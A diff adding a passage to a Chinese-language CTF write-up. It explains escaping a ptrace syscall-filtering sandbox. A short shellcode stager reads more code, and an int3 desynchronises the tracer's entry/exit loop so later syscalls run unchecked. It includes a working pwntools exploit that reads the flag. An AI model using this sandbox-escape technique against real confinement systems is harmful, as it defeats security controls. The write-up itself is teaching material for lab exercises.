@@ -386,4 +386,93 @@ return_0:
 }
 ```
 
-那么此题的大致思路就是，借用ptrace设置沙箱，过滤一些系统调用，然后在输入十字节的shellcode
+那么此题的大致思路就是，借用ptrace设置沙箱，过滤一些系统调用，然后输入shellcode，这里注意虽然它一次调用只能输入十字节的shellcode，但是.......正常人都知道，这肯定是不够的，那么我们就需要对其进行扩展，调用read，使其能够写更多的shellcode进去。
+
++ 首先需要设置rax = 0，此时根据该函数的汇编代码可以看出，在执行完毕10次read循环的时候，rax为1，所以这里就是需要我们xor rax,rax 或者sub rax,1
++ 其次是rdi，还是根据汇编代码观察，在一开始rdi就是0了，所以不需要设置
++ 接着是rsi，指向buf，根据汇编代码观察，mov rsi,rbx 每次循环add rbx,1且每次读入的都是一个数据。所以十次循环后rsi就刚好指向了下一次要读入的地址
++ 最后是rdx，读取长度，直接0x1000
+
+接着就是来讲述漏洞点，先来看这个
+
+```c
+// simplified main tracer loop
+while (1) {
+    // wait for a syscall entry
+    ptrace(PTRACE_SYSCALL, child_pid, 0); // 继续执行子进程，使得子进程在每次进行系统调用及结束一次系统调用时都会被内核停下来，此处是子进程进行系统调用
+    waitpid(child_pid, &status, __WALL); // 等待获取子进程的信号
+    
+    ptrace(PTRACE_GETREGS, child_pid, 0, regs); // 获取寄存器的值
+    if (check_syscall(child_pid, regs)) {
+        // ALLOW SYSCALL
+    } else {
+        // BLOCK SYSCALL
+    }
+
+    // wait for a syscall exit
+    ptrace(PTRACE_SYSCALL, child_pid, 0, 0); // 继续执行子进程，直到子进程结束一次系统调用，然后被暂停
+    waitpid(child_pid, &status, __WALL); // 继续获取子进程的信号
+}
+```
+
+如果我们有办法将其顺序颠倒呢？
+
+```c
+// simplified main tracer loop
+while (1) {
+    // wait for a syscall exit   注意此处，和上面不同
+    ptrace(PTRACE_SYSCALL, child_pid, 0); // 继续执行子进程，使得子进程在每次进行系统调用及结束一次系统调用时都会被内核停下来，此处是子进程结束系统调用
+    waitpid(child_pid, &status, __WALL); // 等待获取子进程的信号
+    
+    ptrace(PTRACE_GETREGS, child_pid, 0, regs); // 获取寄存器的值
+    if (check_syscall(child_pid, regs)) {
+        // ALLOW SYSCALL
+    } else {
+        // BLOCK SYSCALL
+    }
+
+    // wait for a syscall entry  注意此处，和上面不同
+    ptrace(PTRACE_SYSCALL, child_pid, 0, 0); // 继续执行子进程，直到子进程开始一次系统调用，然后被暂停
+    waitpid(child_pid, &status, __WALL); // 继续获取子进程的信号
+}
+```
+
+如果我们的系统调用被父进程捕获是发送在下方的SYSCALL，会发生什么呢？我们的系统调用将不会被ptrace的tracer过滤，可以任意执行。这就是我们所需要的。这里给出exp
+
+```python
+# First 10 bytes of shellcode, used only to load the rest of the shellcode
+shellcode = asm('''
+push 1000
+pop rdx
+xor eax, eax
+syscall
+''', arch='amd64')
+
+# Some nops to be sure there is no SIGSEV
+# Invoke int3 to invert the main tracer loop
+shellcode += asm('''
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+mov rax, 8
+int3
+''', arch='amd64')
+
+# And now just read the flag file :)
+shellcode += asm(shellcraft.amd64.cat('flag'), arch='amd64')
+```
+
+该exp对应上述的捕获流程：
+
++ 第一次while：open开始信号发出，正常的被tracer捕获，tracee暂停，由tracer进行check，然后open结束信号发出被捕获，tracee继续运行
++ 第二次while：int 3信号被发出，这里注意一点，int 3信号不像其他系统调用，会有两次信号发出（开始和结束），它只会发出一次信号。（为什么只发出一次呢，个人猜测是因为它属于中断，结束的时候需要恢复上下文，这就表明eax之类的寄存器值都是调用前的值，程序没变过，所以不会被捕获到int 3结束）
++ 接上面第二次while：那么这时候，因为只有一次信号被捕获，所以程序流就执行了while的SYSCALL
++ 后续就执行cat flag，因为此时是从下方的SYSCALL执行的，不会有check，shellcode安全执行
++ 第三次while：这里的while就只执行了最开始的那一次SYSCALL，对应于open的结束信号。
+
+真是magic的做法呢！
+
